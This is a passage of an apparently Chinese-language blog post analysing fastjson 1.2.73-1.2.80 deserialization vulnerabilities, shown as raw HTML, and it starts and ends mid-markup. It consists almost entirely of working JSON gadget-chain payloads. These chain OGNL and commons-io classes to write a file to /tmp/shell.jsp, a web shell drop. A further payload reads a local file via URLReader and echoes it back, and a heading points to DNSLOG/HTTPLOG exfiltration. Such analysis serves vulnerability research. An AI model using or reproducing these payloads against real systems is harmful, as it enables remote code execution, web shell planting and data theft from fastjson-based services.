class="line">                        &quot;stream&quot;: &#123;</span><br><span class="line">                            &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,</span><br><span class="line">                            &quot;delegate&quot;: &#123;</span><br><span class="line">                                &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,</span><br><span class="line">                                &quot;reader&quot;: &#123;</span><br><span class="line">                                    &quot;@type&quot;: &quot;org.apache.commons.io.input.XmlStreamReader&quot;,</span><br><span class="line">                                    &quot;is&quot;: &#123;</span><br><span class="line">                                        &quot;@type&quot;: &quot;org.apache.commons.io.input.TeeInputStream&quot;,</span><br><span class="line">                                        &quot;input&quot;: &#123;</span><br><span class="line">                                            &quot;$ref&quot;: &quot;$.z.node.p.stream.delegate.reader.is.input&quot;</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;branch&quot;: &#123;</span><br><span class="line">                                            &quot;$ref&quot;: &quot;$.z.node.p.stream.delegate.reader.is.branch&quot;</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;closeBranch&quot;: true</span><br><span class="line">                                    &#125;,</span><br><span class="line">                                    &quot;httpContentType&quot;: &quot;text/xml&quot;,</span><br><span class="line">                                    &quot;lenient&quot;: false,</span><br><span class="line">                                    &quot;defaultEncoding&quot;: &quot;UTF-8&quot;</span><br><span class="line">                                &#125;,</span><br><span class="line">                                &quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                                &quot;bufferSize&quot;: 1024</span><br><span class="line">                            &#125;,</span><br><span class="line">                            &quot;boms&quot;: [</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;bytes&quot;</span>: [</span><br><span class="line">                                        <span class="number">36</span>,</span><br><span class="line">                                        <span class="number">82</span></span><br><span class="line">                                    ]</span><br><span class="line">                                &#125;</span><br><span class="line">                            ]</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;w&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;ognl.Evaluation&quot;,</span><br><span class="line">                &quot;node&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;ognl.ASTMethod&quot;,</span><br><span class="line">                    &quot;p&quot;: &#123;</span><br><span class="line">                        &quot;@type&quot;: &quot;ognl.OgnlParser&quot;,</span><br><span class="line">                        &quot;stream&quot;: &#123;</span><br><span class="line">                            &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,</span><br><span class="line">                            &quot;delegate&quot;: &#123;</span><br><span class="line">                                &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,</span><br><span class="line">                                &quot;reader&quot;: &#123;</span><br><span class="line">                                    &quot;@type&quot;: &quot;org.apache.commons.io.input.XmlStreamReader&quot;,</span><br><span class="line">                                    &quot;is&quot;: &#123;</span><br><span class="line">                                        &quot;@type&quot;: &quot;org.apache.commons.io.input.TeeInputStream&quot;,</span><br><span class="line">                                        &quot;input&quot;: &#123;</span><br><span class="line">                                            &quot;$ref&quot;: &quot;$.z.node.p.stream.delegate.reader.is.input&quot;</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;branch&quot;: &#123;</span><br><span class="line">                                            &quot;$ref&quot;: &quot;$.z.node.p.stream.delegate.reader.is.branch&quot;</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;closeBranch&quot;: true</span><br><span class="line">                                    &#125;,</span><br><span class="line">                                    &quot;httpContentType&quot;: &quot;text/xml&quot;,</span><br><span class="line">                                    &quot;lenient&quot;: false,</span><br><span class="line">                                    &quot;defaultEncoding&quot;: &quot;UTF-8&quot;</span><br><span class="line">                                &#125;,</span><br><span class="line">                                &quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                                &quot;bufferSize&quot;: 1024</span><br><span class="line">                            &#125;,</span><br><span class="line">                            &quot;boms&quot;: [</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;bytes&quot;</span>: [</span><br><span class="line">                                        <span class="number">36</span>,</span><br><span class="line">                                        <span class="number">82</span></span><br><span class="line">                                    ]</span><br><span class="line">                                &#125;</span><br><span class="line">                            ]</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/31.png" alt="31" style="zoom:50%;" /></div></li><li><p>WriteOutputStream使用包含charset的构造方法，只需要将charsetName修改位charset即可</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;x&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;ognl.OgnlException&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;y&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;java.lang.String&quot;</span><br><span class="line">                &quot;@type&quot;: &quot;ognl.OgnlException&quot;,</span><br><span class="line">                &quot;_evaluation&quot;: &quot;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;z&quot;: &#123;</span><br><span class="line">            &quot;@type&quot;: &quot;ognl.Evaluation&quot;,</span><br><span class="line">            &quot;node&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;ognl.ASTMethod&quot;,</span><br><span class="line">                &quot;p&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;ognl.OgnlParser&quot;,</span><br><span class="line">                    &quot;stream&quot;: &#123;</span><br><span class="line">                        &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,</span><br><span class="line">                        &quot;delegate&quot;: &#123;</span><br><span class="line">                            &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,</span><br><span class="line">                            &quot;reader&quot;: &#123;</span><br><span class="line">                                &quot;@type&quot;: &quot;org.apache.commons.io.input.XmlStreamReader&quot;,</span><br><span class="line">                                &quot;is&quot;: &#123;</span><br><span class="line">                                    &quot;@type&quot;: &quot;org.apache.commons.io.input.TeeInputStream&quot;,</span><br><span class="line">                                    &quot;input&quot;: &#123;</span><br><span class="line">                                        &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,</span><br><span class="line">                                        &quot;reader&quot;: &#123;</span><br><span class="line">                                            &quot;@type&quot;: &quot;org.apache.commons.io.input.CharSequenceReader&quot;,</span><br><span class="line">                                            &quot;charSequence&quot;: &#123;</span><br><span class="line">                                                &quot;@type&quot;: &quot;java.lang.String&quot;&quot;something&gt;8192&quot;</span><br><span class="line">                                            &#125;,</span><br><span class="line">                                            &quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                                            &quot;bufferSize&quot;: 1024</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;branch&quot;: &#123;</span><br><span class="line">                                            &quot;@type&quot;: &quot;org.apache.commons.io.output.WriterOutputStream&quot;,</span><br><span class="line">                                            &quot;writer&quot;: &#123;</span><br><span class="line">                                                &quot;@type&quot;: &quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;,</span><br><span class="line">                                                &quot;file&quot;: &quot;/tmp/shell.jsp&quot;,</span><br><span class="line">                                                &quot;encoding&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                                                &quot;append&quot;: false</span><br><span class="line">                                            &#125;,</span><br><span class="line">                                            &quot;charset&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                                            &quot;bufferSize&quot;: 1024,</span><br><span class="line">                                            &quot;writeImmediately&quot;: true</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;closeBranch&quot;: true</span><br><span class="line">                                    &#125;,</span><br><span class="line">                                    &quot;httpContentType&quot;: &quot;text/xml&quot;,</span><br><span class="line">                                    &quot;lenient&quot;: false,</span><br><span class="line">                                    &quot;defaultEncoding&quot;: &quot;UTF-8&quot;</span><br><span class="line">                                &#125;,</span><br><span class="line">                                &quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                                &quot;bufferSize&quot;: 1024</span><br><span class="line">                            &#125;,</span><br><span class="line">                            &quot;boms&quot;: [</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;bytes&quot;</span>: [</span><br><span class="line">                                        <span class="number">36</span>,</span><br><span class="line">                                        <span class="number">82</span></span><br><span class="line">                                    ]</span><br><span class="line">                                &#125;</span><br><span class="line">                            ]</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;u&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;ognl.Evaluation&quot;,</span><br><span class="line">                &quot;node&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;ognl.ASTMethod&quot;,</span><br><span class="line">                    &quot;p&quot;: &#123;</span><br><span class="line">                        &quot;@type&quot;: &quot;ognl.OgnlParser&quot;,</span><br><span class="line">                        &quot;stream&quot;: &#123;</span><br><span class="line">                            &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,</span><br><span class="line">                            &quot;delegate&quot;: &#123;</span><br><span class="line">                                &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,</span><br><span class="line">                                &quot;reader&quot;: &#123;</span><br><span class="line">                                    &quot;@type&quot;: &quot;org.apache.commons.io.input.XmlStreamReader&quot;,</span><br><span class="line">                                    &quot;is&quot;: &#123;</span><br><span class="line">                                        &quot;@type&quot;: &quot;org.apache.commons.io.input.TeeInputStream&quot;,</span><br><span class="line">                                        &quot;input&quot;: &#123;</span><br><span class="line">                                            &quot;$ref&quot;: &quot;$.z.node.p.stream.delegate.reader.is.input&quot;</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;branch&quot;: &#123;</span><br><span class="line">                                            &quot;$ref&quot;: &quot;$.z.node.p.stream.delegate.reader.is.branch&quot;</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;closeBranch&quot;: true</span><br><span class="line">                                    &#125;,</span><br><span class="line">                                    &quot;httpContentType&quot;: &quot;text/xml&quot;,</span><br><span class="line">                                    &quot;lenient&quot;: false,</span><br><span class="line">                                    &quot;defaultEncoding&quot;: &quot;UTF-8&quot;</span><br><span class="line">                                &#125;,</span><br><span class="line">                                &quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                                &quot;bufferSize&quot;: 1024</span><br><span class="line">                            &#125;,</span><br><span class="line">                            &quot;boms&quot;: [</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;bytes&quot;</span>: [</span><br><span class="line">                                        <span class="number">36</span>,</span><br><span class="line">                                        <span class="number">82</span></span><br><span class="line">                                    ]</span><br><span class="line">                                &#125;</span><br><span class="line">                            ]</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;v&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;ognl.Evaluation&quot;,</span><br><span class="line">                &quot;node&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;ognl.ASTMethod&quot;,</span><br><span class="line">                    &quot;p&quot;: &#123;</span><br><span class="line">                        &quot;@type&quot;: &quot;ognl.OgnlParser&quot;,</span><br><span class="line">                        &quot;stream&quot;: &#123;</span><br><span class="line">                            &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,</span><br><span class="line">                            &quot;delegate&quot;: &#123;</span><br><span class="line">                                &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,</span><br><span class="line">                                &quot;reader&quot;: &#123;</span><br><span class="line">                                    &quot;@type&quot;: &quot;org.apache.commons.io.input.XmlStreamReader&quot;,</span><br><span class="line">                                    &quot;is&quot;: &#123;</span><br><span class="line">                                        &quot;@type&quot;: &quot;org.apache.commons.io.input.TeeInputStream&quot;,</span><br><span class="line">                                        &quot;input&quot;: &#123;</span><br><span class="line">                                            &quot;$ref&quot;: &quot;$.z.node.p.stream.delegate.reader.is.input&quot;</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;branch&quot;: &#123;</span><br><span class="line">                                            &quot;$ref&quot;: &quot;$.z.node.p.stream.delegate.reader.is.branch&quot;</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;closeBranch&quot;: true</span><br><span class="line">                                    &#125;,</span><br><span class="line">                                    &quot;httpContentType&quot;: &quot;text/xml&quot;,</span><br><span class="line">                                    &quot;lenient&quot;: false,</span><br><span class="line">                                    &quot;defaultEncoding&quot;: &quot;UTF-8&quot;</span><br><span class="line">                                &#125;,</span><br><span class="line">                                &quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                                &quot;bufferSize&quot;: 1024</span><br><span class="line">                            &#125;,</span><br><span class="line">                            &quot;boms&quot;: [</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;bytes&quot;</span>: [</span><br><span class="line">                                        <span class="number">36</span>,</span><br><span class="line">                                        <span class="number">82</span></span><br><span class="line">                                    ]</span><br><span class="line">                                &#125;</span><br><span class="line">                            ]</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;w&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;ognl.Evaluation&quot;,</span><br><span class="line">                &quot;node&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;ognl.ASTMethod&quot;,</span><br><span class="line">                    &quot;p&quot;: &#123;</span><br><span class="line">                        &quot;@type&quot;: &quot;ognl.OgnlParser&quot;,</span><br><span class="line">                        &quot;stream&quot;: &#123;</span><br><span class="line">                            &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,</span><br><span class="line">                            &quot;delegate&quot;: &#123;</span><br><span class="line">                                &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,</span><br><span class="line">                                &quot;reader&quot;: &#123;</span><br><span class="line">                                    &quot;@type&quot;: &quot;org.apache.commons.io.input.XmlStreamReader&quot;,</span><br><span class="line">                                    &quot;is&quot;: &#123;</span><br><span class="line">                                        &quot;@type&quot;: &quot;org.apache.commons.io.input.TeeInputStream&quot;,</span><br><span class="line">                                        &quot;input&quot;: &#123;</span><br><span class="line">                                            &quot;$ref&quot;: &quot;$.z.node.p.stream.delegate.reader.is.input&quot;</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;branch&quot;: &#123;</span><br><span class="line">                                            &quot;$ref&quot;: &quot;$.z.node.p.stream.delegate.reader.is.branch&quot;</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;closeBranch&quot;: true</span><br><span class="line">                                    &#125;,</span><br><span class="line">                                    &quot;httpContentType&quot;: &quot;text/xml&quot;,</span><br><span class="line">                                    &quot;lenient&quot;: false,</span><br><span class="line">                                    &quot;defaultEncoding&quot;: &quot;UTF-8&quot;</span><br><span class="line">                                &#125;,</span><br><span class="line">                                &quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                                &quot;bufferSize&quot;: 1024</span><br><span class="line">                            &#125;,</span><br><span class="line">                            &quot;boms&quot;: [</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                                    <span class="attr">&quot;bytes&quot;</span>: [</span><br><span class="line">                                        <span class="number">36</span>,</span><br><span class="line">                                        <span class="number">82</span></span><br><span class="line">                                    ]</span><br><span class="line">                                &#125;</span><br><span class="line">                            ]</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/32.png" alt="32" style="zoom:50%;" /></div></li></ul><h4 id="3-5-2-读文件"><a href="#3-5-2-读文件" class="headerlink" title="3.5.2 读文件"></a>3.5.2 读文件</h4><h5 id="3-5-2-1-返回包回显可以打印JSONObject的情况"><a href="#3-5-2-1-返回包回显可以打印JSONObject的情况" class="headerlink" title="3.5.2.1 返回包回显可以打印JSONObject的情况"></a>3.5.2.1 返回包回显可以打印JSONObject的情况</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;x&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;ognl.OgnlException&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;y&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;java.lang.String&quot;</span><br><span class="line">                &quot;@type&quot;: &quot;ognl.OgnlException&quot;,</span><br><span class="line">                &quot;_evaluation&quot;: &quot;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;z&quot;: &#123;</span><br><span class="line">            &quot;@type&quot;: &quot;ognl.Evaluation&quot;,</span><br><span class="line">            &quot;node&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;ognl.ASTMethod&quot;,</span><br><span class="line">                &quot;p&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;ognl.OgnlParser&quot;,</span><br><span class="line">                    &quot;stream&quot;: &#123;</span><br><span class="line">                        &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,</span><br><span class="line">                        &quot;delegate&quot;: &#123;</span><br><span class="line">                            &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,</span><br><span class="line">                            &quot;reader&quot;: &#123;</span><br><span class="line">                                &quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;,</span><br><span class="line">                                &quot;url&quot;: &quot;file:///tmp/flag&quot;</span><br><span class="line">                            &#125;,</span><br><span class="line">                            &quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                            &quot;bufferSize&quot;: 1024</span><br><span class="line">                        &#125;,</span><br><span class="line">                        &quot;boms&quot;: [&#123;</span><br><span class="line">                            &quot;@type&quot;: &quot;org.apache.commons.io.ByteOrderMark&quot;,</span><br><span class="line">                            &quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                            &quot;bytes&quot;: [</span><br><span class="line">                                106,115,111,110</span><br><span class="line">                            ]</span><br><span class="line">                        &#125;]</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;u&quot;: &#123;</span><br><span class="line">            &quot;$ref&quot;: &quot;$.z.node.p.stream&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;v&quot;: &#123;</span><br><span class="line">            &quot;$ref&quot;: &quot;$.u.bOM.bytes&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/33.png" alt="33" style="zoom:50%;" /></div><h5 id="3-5-2-2-报错不一致、DNSLOG、HTTPLOG"><a href="#3-5-2-2-报错不一致、DNSLOG、HTTPLOG" class="headerlink" title="3.5.2.2 报错不一致、DNSLOG、HTTPLOG"></a>3.5.2.2 报错不一致、DNSLOG、HTTPLOG</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span 